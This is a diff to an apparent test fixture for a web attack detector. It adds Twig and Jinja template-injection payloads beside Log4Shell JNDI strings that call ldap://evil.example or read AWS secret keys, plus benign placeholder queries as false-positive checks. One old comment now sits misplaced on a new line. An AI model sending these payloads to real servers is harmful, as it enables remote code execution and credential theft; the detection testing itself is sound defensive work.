@@ -131,7 +131,11 @@ return [
             ['/?a=${ctx:loginId}', [], 'ATK-JNDI'],
             ['/?a=${${base64:am5kaQ==}:ldap://evil.example/x}', [], 'ATK-JNDI'],
             ['/?a=${j${::-n}di:ldap://evil.example/x}', [], 'ATK-JNDI'],
-            ['/?q=${a ${b}', [], 'ATK-JNDI'],                                      // the price: a ${ before the first one closes
+            ['/?q=${a ${b}', [], 'ATK-JNDI'],
+            ['/search?q=%7B%7B7*7%7D%7D', [], 'ATK-SSTI'],                                // template injection: does it compute?
+            ['/?name={{_self.env.registerUndefinedFilterCallback(%22exec%22)}}', [], 'ATK-SSTI'],   // Twig
+            ['/?q={{[%27id%27]|filter(%27system%27)}}', [], 'ATK-SSTI'],
+            ['/?q={{%27%27.__class__.__mro__}}', [], 'ATK-SSTI'],                          // Jinja                                      // the price: a ${ before the first one closes
             ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
             ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
             ['/', ['HTTP_X_FORWARDED_FOR' => '${jndi:ldap://evil.example/x}'], 'ATK-JNDI'],
@@ -182,6 +186,8 @@ return [
             '/?q=rock and roll 2=2',                 // a small number: not sqlmap's test
             '/?q=a or 1=2',                          // small numbers, not 1=1
             '/?q=size 42 and 43',
+            '/search?q=%7B%7B%20user.name%20%7D%7D', // a placeholder, nothing computed
+            '/?q={{ title }} and {{ date }}',
             '/?q=information about cookies',         // not information_schema
             '/?q=load file into outfile tutorial',   // the words, no quote, no bracket
             '/?q=extract value from json',           // extractvalue( needed
